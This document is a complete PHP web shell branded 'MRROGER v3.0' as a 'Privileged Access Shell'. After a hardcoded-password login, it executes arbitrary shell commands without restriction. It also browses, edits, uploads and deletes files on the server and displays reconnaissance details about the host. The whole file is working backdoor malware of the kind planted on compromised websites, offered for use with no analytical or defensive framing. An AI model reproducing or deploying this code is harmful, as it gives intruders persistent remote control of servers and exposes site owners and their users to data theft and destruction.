<?php
session_start();

define('PASSWORD', 'S2prc3pwajEyQEA=');
define('SESSION_KEY', 'wolf_auth');

if (!isset($_SESSION[SESSION_KEY]) || $_SESSION[SESSION_KEY] !== true) {
    if (isset($_POST['pass'])) {
        if (base64_encode($_POST['pass']) === PASSWORD) {
            $_SESSION[SESSION_KEY] = true;
        } else {
            $error = "Access Denied!";
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Privileged Access Shell</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                background: #0b0e14;
                color: #0088ff;
                font-family: 'Courier New', monospace;
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                overflow: hidden;
                position: relative;
            }
            #rain {
                position: fixed;
                top: 0; left: 0;
                width: 100%; height: 100%;
                pointer-events: none;
                z-index: 0;
                opacity: 0.35;
            }
            .login-box {
                background: rgba(8, 12, 18, 0.92);
                border: 1px solid #0088ff;
                border-radius: 12px;
                box-shadow: 0 0 50px rgba(0, 136, 255, 0.3);
                padding: 45px 40px;
                width: 420px;
                text-align: center;
                position: relative;
                z-index: 1;
                backdrop-filter: blur(4px);
            }
            .login-box h1 {
                font-size: 1.5em;
                text-transform: uppercase;
                letter-spacing: 5px;
                margin-bottom: 8px;
                text-shadow: 0 0 25px #0088ff;
                font-weight: 300;
            }
            .login-box .sub {
                font-size: 0.85em;
                color: #3a7bd5;
                letter-spacing: 3px;
                margin-bottom: 30px;
                border-bottom: 1px solid #0088ff33;
                padding-bottom: 12px;
            }
            .login-box input {
                background: transparent;
                border: 1px solid #0088ff;
                border-radius: 6px;
                color: #0088ff;
                padding: 13px 20px;
                width: 100%;
                font-size: 1.1em;
                font-family: inherit;
                outline: none;
                transition: 0.3s;
                letter-spacing: 2px;
            }
            .login-box input:focus {
                box-shadow: 0 0 20px #0088ff55;
                border-color: #00aaff;
            }
            .login-box button {
                background: #0088ff;
                color: #fff;
                border: none;
                border-radius: 6px;
                padding: 13px 35px;
                font-size: 1em;
                font-family: inherit;
                font-weight: 600;
                cursor: pointer;
                margin-top: 20px;
                text-transform: uppercase;
                transition: 0.3s;
                letter-spacing: 3px;
            }
            .login-box button:hover {
                background: #0066cc;
                box-shadow: 0 0 30px #0088ff;
            }
            .error {
                color: #ff3b3b;
                margin-top: 15px;
                text-shadow: 0 0 10px #ff3b3b;
                font-weight: bold;
            }
            .spinner-overlay {
                display: none;
                position: fixed;
                top: 0; left: 0;
                width: 100%; height: 100%;
                background: rgba(0,0,0,0.6);
                z-index: 9999;
                justify-content: center;
                align-items: center;
                backdrop-filter: blur(2px);
            }
            .spinner-overlay.active {
                display: flex;
            }
            .spinner {
                width: 28px;
                height: 28px;
                border: 3px solid #0088ff40;
                border-top: 3px solid #0088ff;
                border-radius: 50%;
                animation: spin 0.8s linear infinite;
                box-shadow: none;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
    </head>
    <body>
    <canvas id="rain"></canvas>
    <div class="login-box">
        <h1>Privileged Access</h1>
        <div class="sub">- MRROGER v3.0 -</div>
        <form method="post" onsubmit="showSpinner()">
            <input type="password" name="pass" placeholder="ENTER YOUR PASSWORD" autofocus>
            <button type="submit">UNLOCK</button>
        </form>
        <?php if (isset($error)) echo "<div class='error'>$error</div>"; ?>
    </div>
    <div id="global-spinner" class="spinner-overlay">
        <div class="spinner"></div>
    </div>
    <script>
        const canvas = document.getElementById('rain');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ<>?/|\\{}[]!@#$%^&*()';
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);
        function draw() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#0088ff';
            ctx.font = fontSize + 'px monospace';
            for (let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(draw, 33);
        window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });
        function showSpinner() {
            document.getElementById('global-spinner').classList.add('active');
        }
    </script>
    </body>
    </html>
    <?php
    exit;
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
    exit;
}

$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
if (!$current_dir || !is_dir($current_dir)) $current_dir = getcwd();
chdir($current_dir);

function listFiles($dir) {
    $items = scandir($dir);
    $files = array();
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = $dir . '/' . $item;
        $owner = function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($path))['name'] : fileowner($path);
        $group = function_exists('posix_getgrgid') ? posix_getgrgid(filegroup($path))['name'] : filegroup($path);
        $files[] = array(
            'name' => $item,
            'path' => $path,
            'is_dir' => is_dir($path),
            'size' => is_file($path) ? filesize($path) : '-',
            'perm' => substr(sprintf('%o', fileperms($path)), -4),
            'owner' => $owner,
            'group' => $group,
            'mtime' => date('Y-m-d H:i:s', filemtime($path))
        );
    }
    usort($files, function($a, $b) {
        if ($a['is_dir'] != $b['is_dir']) {
            return $a['is_dir'] ? -1 : 1;
        }
        return strcasecmp($a['name'], $b['name']);
    });
    return $files;
}

$action = isset($_POST['action']) ? $_POST['action'] : '';
$target = isset($_POST['target']) ? $_POST['target'] : '';

if ($action === 'delete') {
    $target = realpath($target);
    if ($target && strpos($target, realpath($current_dir)) === 0) {
        if (is_file($target)) unlink($target);
        elseif (is_dir($target)) {
            $it = new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS);
            $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
            foreach ($files as $f) {
                if ($f->isDir()) rmdir($f->getRealPath());
                else unlink($f->getRealPath());
            }
            rmdir($target);
        }
    }
    header("Location: ?dir=" . urlencode($current_dir));
    exit;
}

if ($action === 'create') {
    $name = isset($_POST['name']) ? $_POST['name'] : '';
    $type = isset($_POST['type']) ? $_POST['type'] : 'file';
    $path = $current_dir . '/' . $name;
    if ($type === 'file') {
        file_put_contents($path, '');
    } else {
        mkdir($path, 0755, true);
    }
    header("Location: ?dir=" . urlencode($current_dir));
    exit;
}

if ($action === 'edit_save') {
    $file = realpath($target);
    if ($file && is_file($file) && strpos($file, realpath($current_dir)) === 0) {
        file_put_contents($file, $_POST['content']);
    }
    header("Location: ?dir=" . urlencode($current_dir));
    exit;
}

if ($action === 'upload') {
    if (isset($_FILES['file'])) {
        $upload_dir = $current_dir . '/' . (isset($_POST['subdir']) ? $_POST['subdir'] : '');
        if (!is_dir($upload_dir)) mkdir($upload_dir, 0755, true);
        $dest = $upload_dir . '/' . basename($_FILES['file']['name']);
        move_uploaded_file($_FILES['file']['tmp_name'], $dest);
    }
    header("Location: ?dir=" . urlencode($current_dir));
    exit;
}

if (isset($_GET['view'])) {
    $requested = $_GET['view'];
    $file = realpath($requested);
    if (!$file || !is_file($file)) {
        $file = $current_dir . '/' . basename($requested);
        $file = realpath($file);
    }
    header('Content-Type: text/plain');
    if ($file && is_file($file) && strpos($file, realpath($current_dir)) === 0) {
        echo file_get_contents($file);
    } else {
        echo "Error: File tidak ditemukan atau akses ditolak. Path: " . htmlspecialchars($requested);
    }
    exit;
}

if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd . ' 2>&1');
    echo "<pre style='color:#0088ff;background:#0b0e14;padding:10px;margin:0;font-size:13px;'>" . htmlspecialchars($output) . "</pre>";
    exit;
}

$files = listFiles($current_dir);

// ============ KUMPULAN INFO SERVER ============
$server_uname = php_uname();
$server_user = get_current_user();
$server_php = PHP_VERSION . ' Safe Mode: ' . (ini_get('safe_mode') ? 'ON' : 'OFF');
$server_ip = $_SERVER['SERVER_ADDR'] . ' Your IP: ' . $_SERVER['REMOTE_ADDR'];
$disk_total = disk_total_space('/');
$disk_free = disk_free_space('/');
$disk_total_gb = round($disk_total / (1024*1024*1024), 2);
$disk_free_gb = round($disk_free / (1024*1024*1024), 2);
$disk_percent = round(($disk_total - $disk_free) / $disk_total * 100);
$server_hdd = "Total:{$disk_total_gb} GB Free:{$disk_free_gb} GB [{$disk_percent}%]";
$useful = 'makephpperlpythonrubytargzipwgetlynxcurl';
$curl = extension_loaded('curl') ? 'ON' : 'OFF';
$ssh2 = extension_loaded('ssh2') ? 'ON' : 'OFF';
$magic_quotes = (bool)ini_get('magic_quotes_gpc') ? 'ON' : 'OFF';
$mysql = extension_loaded('mysqli') || extension_loaded('mysql') ? 'ON' : 'OFF';
$mssql = extension_loaded('mssql') || extension_loaded('sqlsrv') ? 'ON' : 'OFF';
$pgsql = extension_loaded('pgsql') ? 'ON' : 'OFF';
$oracle = extension_loaded('oci8') ? 'ON' : 'OFF';
$cgi = (stripos(PHP_SAPI, 'cgi') !== false) ? 'ON' : 'OFF';
$open_basedir = ini_get('open_basedir') ?: 'NONE';
$safe_mode_exec_dir = ini_get('safe_mode_exec_dir') ?: 'NONE';
// =============================================
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Privileged Access Shell</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0b0e14;
            color: #0088ff;
            font-family: 'Courier New', monospace;
            padding: 20px;
            min-height: 100vh;
        }
        #rain-bg {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            pointer-events: none;
            z-index: 0;
            opacity: 0.25;
        }
        .container {
            position: relative;
            z-index: 1;
            max-width: 1400px;
            margin: 0 auto;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            border-bottom: 1px solid #0088ff55;
            padding-bottom: 12px;
            margin-bottom: 20px;
            text-shadow: 0 0 20px #0088ff44;
            gap: 15px;
        }
        .header .logout {
            color: #ff3b3b;
            text-decoration: none;
            border: 1px solid #ff3b3b;
            border-radius: 4px;
            padding: 6px 16px;
            transition: 0.3s;
            font-size: 0.9em;
            white-space: nowrap;
            flex-shrink: 0;
        }
        .header .logout:hover {
            background: #ff3b3b;
            color: #fff;
            box-shadow: 0 0 15px #ff3b3b;
        }
        .server-info {
            font-size: 0.8em;
            line-height: 1.6;
            color: #0088ff;
            text-shadow: 0 0 5px #0088ff33;
            flex: 1;
        }
        .blink-bullet {
            color: #00aaff;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
        .path-bar {
            background: #11171f;
            border: 1px solid #0088ff55;
            border-radius: 8px;
            padding: 10px 15px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }
        .path-bar .label {
            color: #3a7bd5;
        }
        .path-bar .dir-link {
            color: #0088ff;
            text-decoration: none;
            padding: 2px 5px;
        }
        .path-bar .dir-link:hover {
            text-decoration: underline;
            background: #0088ff22;
            border-radius: 3px;
        }
        .path-bar input[type="text"] {
            background: #0d1117;
            border: 1px solid #0088ff55;
            border-radius: 4px;
            color: #0088ff;
            padding: 6px 12px;
            font-family: inherit;
            flex: 1;
            min-width: 200px;
        }
        .path-bar button {
            background: #0088ff;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 6px 18px;
            font-weight: 600;
            cursor: pointer;
            font-family: inherit;
        }
        .path-bar button:hover { background: #0066cc; }
        .toolbar {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .toolbar button, .toolbar a {
            background: #11171f;
            border: 1px solid #0088ff55;
            border-radius: 6px;
            color: #0088ff;
            padding: 9px 20px;
            cursor: pointer;
            font-family: inherit;
            font-size: 0.85em;
            text-decoration: none;
            transition: 0.3s;
        }
        .toolbar button:hover, .toolbar a:hover {
            background: #0088ff;
            color: #fff;
            box-shadow: 0 0 20px #0088ff44;
        }
        .file-table {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0;
            margin-top: 10px;
            background: rgba(8, 12, 18, 0.6);
            border-radius: 8px;
            overflow: hidden;
        }
        .file-table th {
            border-bottom: 1px solid #0088ff44;
            padding: 10px 12px;
            text-align: center;
            text-transform: uppercase;
            letter-spacing: 1px;
            background: #0d1117;
            color: #3a7bd5;
            font-size: 0.8em;
        }
        .file-table td {
            padding: 8px 12px;
            border-bottom: 1px solid #1e2632;
            vertical-align: middle;
        }
        .file-table tr:last-child td { border-bottom: none; }
        .file-table tr:hover td { background: rgba(0, 136, 255, 0.05); }
        .file-table .icon { font-size: 1.1em; margin-right: 6px; }
        .file-table .name {
            font-size: 14px;
            color: #0088ff;
            text-decoration: none;
        }
        .file-table .name:hover { text-decoration: underline; color: #00aaff; }
        .file-table .actions a, .file-table .actions button {
            color: #0088ff;
            background: none;
            border: 1px solid #0088ff55;
            border-radius: 4px;
            padding: 2px 10px;
            font-size: 0.75em;
            cursor: pointer;
            text-decoration: none;
            margin: 0 2px;
            transition: 0.3s;
        }
        .file-table .actions a:hover, .file-table .actions button:hover { background: #0088ff; color: #fff; }
        .file-table .actions .delete { border-color: #ff3b3b; color: #ff3b3b; }
        .file-table .actions .delete:hover { background: #ff3b3b; color: #fff; }
        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.85);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .modal.active { display: flex; }
        .modal-content {
            background: #0d1117;
            border: 1px solid #0088ff55;
            border-radius: 12px;
            width: 90%;
            max-width: 1000px;
            max-height: 90vh;
            overflow-y: auto;
            padding: 25px;
            position: relative;
            box-shadow: 0 0 50px rgba(0, 136, 255, 0.2);
        }
        .modal-close {
            position: absolute;
            top: 12px; right: 18px;
            color: #ff3b3b;
            font-size: 1.6em;
            cursor: pointer;
            border: none;
            background: none;
            font-family: inherit;
            opacity: 0.7;
        }
        .modal-close:hover { opacity: 1; }
        .modal-title {
            font-size: 1.2em;
            margin-bottom: 15px;
            text-shadow: 0 0 10px #0088ff44;
            color: #3a7bd5;
            letter-spacing: 2px;
        }
        #terminal-output {
            background: #090d12;
            color: #0088ff;
            padding: 15px;
            height: 300px;
            overflow-y: auto;
            font-size: 13px;
            line-height: 1.5;
            border: 1px solid #0088ff55;
            border-radius: 6px;
            margin-bottom: 10px;
            white-space: pre-wrap;
            word-break: break-all;
        }
        #terminal-input { display: flex; gap: 10px; }
        #terminal-input input {
            flex: 1;
            background: #090d12;
            border: 1px solid #0088ff55;
            border-radius: 4px;
            color: #0088ff;
            padding: 10px 14px;
            font-family: inherit;
            font-size: 1em;
        }
        #terminal-input button {
            background: #0088ff;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 10px 22px;
            font-weight: 600;
            cursor: pointer;
            font-family: inherit;
        }
        #terminal-input button:hover { background: #0066cc; }
        .upload-area {
            border: 2px dashed #0088ff55;
            border-radius: 8px;
            padding: 30px;
            text-align: center;
            margin: 15px 0;
            transition: 0.3s;
        }
        .upload-area:hover { background: rgba(0, 136, 255, 0.05); border-color: #0088ff; }
        .upload-area input[type="file"] { color: #0088ff; font-family: inherit; }
        .upload-area button {
            background: #0088ff;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 8px 24px;
            cursor: pointer;
            font-weight: 600;
            margin-top: 10px;
        }
        .upload-area button:hover { background: #0066cc; }
        #edit-area textarea {
            width: 100%;
            height: 400px;
            background: #090d12;
            border: 1px solid #0088ff55;
            border-radius: 6px;
            color: #0088ff;
            padding: 12px;
            font-family: monospace;
            font-size: 13px;
            resize: vertical;
        }
        .glow { text-shadow: 0 0 10px #0088ff; }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #0b0e14; }
        ::-webkit-scrollbar-thumb { background: #0088ff; border-radius: 4px; }
        .spinner-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.6);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(2px);
        }
        .spinner-overlay.active { display: flex; }
        .spinner {
            width: 28px;
            height: 28px;
            border: 3px solid #0088ff40;
            border-top: 3px solid #0088ff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            box-shadow: none;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .footer {
            text-align: center;
            padding: 20px 0 5px 0;
            font-size: 0.75em;
            color: #3a7bd5;
            border-top: 1px solid #0088ff33;
            margin-top: 30px;
            letter-spacing: 2px;
        }
    </style>
</head>
<body>
<canvas id="rain-bg"></canvas>
<div class="container">
    <div class="header">
        <div class="server-info">
            <span class="blink-bullet">•</span> Uname: <?php echo htmlspecialchars($server_uname); ?><br>
            <span class="blink-bullet">•</span> User: <?php echo htmlspecialchars($server_user); ?><br>
            <span class="blink-bullet">•</span> PHP: <?php echo htmlspecialchars($server_php); ?><br>
            <span class="blink-bullet">•</span> ServerIP: <?php echo htmlspecialchars($server_ip); ?><br>
            <span class="blink-bullet">•</span> HDD: <?php echo htmlspecialchars($server_hdd); ?><br>
            <span class="blink-bullet">•</span> Useful: <?php echo htmlspecialchars($useful); ?><br>
            <span class="blink-bullet">•</span> CURL: <?php echo $curl; ?> | SSH2: <?php echo $ssh2; ?> | Magic Quotes: <?php echo $magic_quotes; ?> | MySQL: <?php echo $mysql; ?> | MSSQL: <?php echo $mssql; ?> | PostgreSQL: <?php echo $pgsql; ?> | Oracle: <?php echo $oracle; ?> | CGI: <?php echo $cgi; ?><br>
            <span class="blink-bullet">•</span> Open_basedir: <?php echo htmlspecialchars($open_basedir); ?> | Safe_mode_exec_dir: <?php echo htmlspecialchars($safe_mode_exec_dir); ?>
        </div>
        <a href="?logout=1" class="logout" onclick="return confirmLogout()">[EXIT]</a>
    </div>
    <form method="get" class="path-bar" onsubmit="showSpinner()">
        <span class="label">ROOT ></span>
        <?php
        $parts = explode('/', trim($current_dir, '/'));
        $path = '';
        foreach ($parts as $p) {
            $path .= '/' . $p;
            echo "<a href='?dir=" . urlencode($path) . "' class='dir-link' onclick='showSpinner()'>$p</a> / ";
        }
        ?>
        <input type="text" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>" placeholder="Direct path">
        <button type="submit">GO</button>
    </form>
    <div class="toolbar">
        <button onclick="openModal('createModal')">+ NEW FILE</button>
        <button onclick="openModal('createDirModal')">+ NEW FOLDER</button>
        <button onclick="openModal('uploadModal')">⬆ UPLOAD</button>
        <button onclick="openModal('terminalModal')">⌨ TERMINAL</button>
        <button onclick="location.reload()">⟳ REFRESH</button>
    </div>

    <table class="file-table">
        <thead>
            <tr>
                <th>Name</th>
                <th>Size</th>
                <th>Perm</th>
                <th>Owner/Group</th>
                <th>Modified</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <tr>
                <td colspan="6"><a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" class="name" onclick="showSpinner()">📁 .. (parent)</a></td>
            </tr>
            <?php foreach ($files as $f):
                if ($f['is_dir']): ?>
                <tr>
                    <td><a href="?dir=<?php echo urlencode($f['path']); ?>" class="name" onclick="showSpinner()">📁 <?php echo htmlspecialchars($f['name']); ?></a></td>
                    <td>-</td>
                    <td><?php echo $f['perm']; ?></td>
                    <td><?php echo htmlspecialchars($f['owner'] . '/' . $f['group']); ?></td>
                    <td><?php echo $f['mtime']; ?></td>
                    <td class="actions">
                        <form method="post" style="display:inline" onsubmit="return confirm('Delete folder <?php echo htmlspecialchars($f['name']); ?>?') && showSpinner()">
                            <input type="hidden" name="action" value="delete">
                            <input type="hidden" name="target" value="<?php echo htmlspecialchars($f['path']); ?>">
                            <button type="submit" class="delete">🗑 Delete</button>
                        </form>
                    </td>
                </tr>
                <?php else: ?>
                <tr>
                    <td>
                        <span class="icon">📄</span>
                        <a href="#" onclick="viewFile('<?php echo htmlspecialchars(addslashes($f['path'])); ?>'); return false;" class="name"><?php echo htmlspecialchars($f['name']); ?></a>
                    </td>
                    <td><?php echo number_format($f['size']); ?> B</td>
                    <td><?php echo $f['perm']; ?></td>
                    <td><?php echo htmlspecialchars($f['owner'] . '/' . $f['group']); ?></td>
                    <td><?php echo $f['mtime']; ?></td>
                    <td class="actions">
                        <a href="#" onclick="editFile('<?php echo htmlspecialchars(addslashes($f['path'])); ?>'); return false;">✏ Edit</a>
                        <a href="#" onclick="viewFile('<?php echo htmlspecialchars(addslashes($f['path'])); ?>'); return false;">👁 View</a>
                        <form method="post" style="display:inline" onsubmit="return confirm('Delete <?php echo htmlspecialchars($f['name']); ?>?') && showSpinner()">
                            <input type="hidden" name="action" value="delete">
                            <input type="hidden" name="target" value="<?php echo htmlspecialchars($f['path']); ?>">
                            <button type="submit" class="delete">🗑 Delete</button>
                        </form>
                    </td>
                </tr>
                <?php endif; endforeach; ?>
        </tbody>
    </table>
    <div class="footer">- MRROGER -</div>
</div>

<div id="global-spinner" class="spinner-overlay">
    <div class="spinner"></div>
</div>

<div id="createModal" class="modal">
    <div class="modal-content">
        <button class="modal-close" onclick="closeModal('createModal')">✖</button>
        <div class="modal-title">CREATE NEW FILE</div>
        <form method="post" onsubmit="showSpinner()">
            <input type="hidden" name="action" value="create">
            <input type="hidden" name="type" value="file">
            <input type="text" name="name" placeholder="filename.ext" style="width:100%;background:#090d12;border:1px solid #0088ff55;border-radius:4px;color:#0088ff;padding:10px;font-family:inherit;margin-bottom:10px;">
            <button type="submit" style="background:#0088ff;color:#fff;border:none;border-radius:4px;padding:10px 20px;cursor:pointer;font-weight:600;">CREATE</button>
        </form>
    </div>
</div>

<div id="createDirModal" class="modal">
    <div class="modal-content">
        <button class="modal-close" onclick="closeModal('createDirModal')">✖</button>
        <div class="modal-title">CREATE NEW FOLDER</div>
        <form method="post" onsubmit="showSpinner()">
            <input type="hidden" name="action" value="create">
            <input type="hidden" name="type" value="dir">
            <input type="text" name="name" placeholder="foldername" style="width:100%;background:#090d12;border:1px solid #0088ff55;border-radius:4px;color:#0088ff;padding:10px;font-family:inherit;margin-bottom:10px;">
            <button type="submit" style="background:#0088ff;color:#fff;border:none;border-radius:4px;padding:10px 20px;cursor:pointer;font-weight:600;">CREATE</button>
        </form>
    </div>
</div>

<div id="uploadModal" class="modal">
    <div class="modal-content">
        <button class="modal-close" onclick="closeModal('uploadModal')">✖</button>
        <div class="modal-title">UPLOAD FILE</div>
        <div class="upload-area">
            <form method="post" enctype="multipart/form-data" onsubmit="showSpinner()">
                <input type="hidden" name="action" value="upload">
                <p style="margin-bottom:15px;">Choose file(s) or drag & drop (single)</p>
                <input type="file" name="file" required><br>
                <small>Optional: subfolder (relative to current dir)</small><br>
                <input type="text" name="subdir" placeholder="subfolder name (leave empty for root)" style="background:#090d12;border:1px solid #0088ff55;border-radius:4px;color:#0088ff;padding:5px;margin:10px 0;width:80%;font-family:inherit;">
                <br>
                <button type="submit">UPLOAD</button>
            </form>
        </div>
    </div>
</div>

<div id="terminalModal" class="modal">
    <div class="modal-content" style="max-height: 80vh;">
        <button class="modal-close" onclick="closeModal('terminalModal')">✖</button>
        <div class="modal-title">⌨ PRIVILEGED TERMINAL</div>
        <div id="terminal-output">Welcome to Privileged Access Shell. Type your commands below.<br></div>
        <div id="terminal-input">
            <input type="text" id="cmd-input" placeholder="Enter command..." autofocus>
            <button onclick="execCommand()">EXECUTE</button>
            <button onclick="document.getElementById('cmd-input').value=''; document.getElementById('terminal-output').innerHTML='';" style="background:#ff3b3b;color:#fff;">CLEAR</button>
        </div>
        <small style="color:#3a7bd5;display:block;margin-top:10px;">No restrictions command</small>
    </div>
</div>

<div id="viewModal" class="modal">
    <div class="modal-content">
        <button class="modal-close" onclick="closeModal('viewModal')">✖</button>
        <div id="viewContent" style="background:#090d12;color:#0088ff;padding:15px;overflow:auto;max-height:70vh;white-space:pre-wrap;font-size:13px;border-radius:6px;"></div>
    </div>
</div>

<div id="editModal" class="modal">
    <div class="modal-content">
        <button class="modal-close" onclick="closeModal('editModal')">✖</button>
        <div class="modal-title">EDIT FILE</div>
        <form method="post" id="editForm" onsubmit="showSpinner()">
            <input type="hidden" name="action" value="edit_save">
            <input type="hidden" name="target" id="editTarget">
            <div id="edit-area"><textarea name="content" id="editContent"></textarea></div>
            <button type="submit" style="background:#0088ff;color:#fff;border:none;border-radius:4px;padding:10px 20px;cursor:pointer;font-weight:600;margin-top:10px;">SAVE</button>
        </form>
    </div>
</div>

<script>
const canvas = document.getElementById('rain-bg');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;
const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ<>?/|\\{}[]!@#$%^&*()';
const fontSize = 14;
const columns = canvas.width / fontSize;
const drops = Array(Math.floor(columns)).fill(1);
function drawRain() {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#0088ff';
    ctx.font = fontSize + 'px monospace';
    for (let i = 0; i < drops.length; i++) {
        const text = chars[Math.floor(Math.random() * chars.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    }
}
setInterval(drawRain, 33);
window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });

function showSpinner() { document.getElementById('global-spinner').classList.add('active'); }
function hideSpinner() { document.getElementById('global-spinner').classList.remove('active'); }
window.addEventListener('load', hideSpinner);

function confirmLogout() {
    return confirm('Are you sure you want to exit?');
}

function openModal(id) {
    document.getElementById(id).classList.add('active');
    if (id === 'terminalModal') setTimeout(() => document.getElementById('cmd-input').focus(), 100);
}
function closeModal(id) { document.getElementById(id).classList.remove('active'); }
document.querySelectorAll('.modal').forEach(m => {
    m.addEventListener('click', function(e) { if (e.target === this) this.classList.remove('active'); });
});

function viewFile(path) {
    showSpinner();
    fetch('?view=' + encodeURIComponent(path))
        .then(r => r.text())
        .then(data => { document.getElementById('viewContent').textContent = data; openModal('viewModal'); hideSpinner(); })
        .catch(() => hideSpinner());
}
function editFile(path) {
    showSpinner();
    fetch('?view=' + encodeURIComponent(path))
        .then(r => r.text())
        .then(data => { document.getElementById('editTarget').value = path; document.getElementById('editContent').value = data; openModal('editModal'); hideSpinner(); })
        .catch(() => hideSpinner());
}
function execCommand() {
    const input = document.getElementById('cmd-input');
    const output = document.getElementById('terminal-output');
    const cmd = input.value.trim();
    if (!cmd) return;
    output.innerHTML += '<span style="color:#3a7bd5;">$ ' + cmd + '</span>\n';
    input.value = '';
    showSpinner();
    const formData = new FormData();
    formData.append('cmd', cmd);
    fetch('', { method: 'POST', body: formData })
        .then(r => r.text())
        .then(data => { output.innerHTML += data + '\n'; output.scrollTop = output.scrollHeight; hideSpinner(); })
        .catch(e => { output.innerHTML += '<span style="color:#ff3b3b;">Error: ' + e + '</span>\n'; hideSpinner(); });
}
document.getElementById('cmd-input').addEventListener('keydown', function(e) { if (e.key === 'Enter') execCommand(); });
</script>
</body>
</html>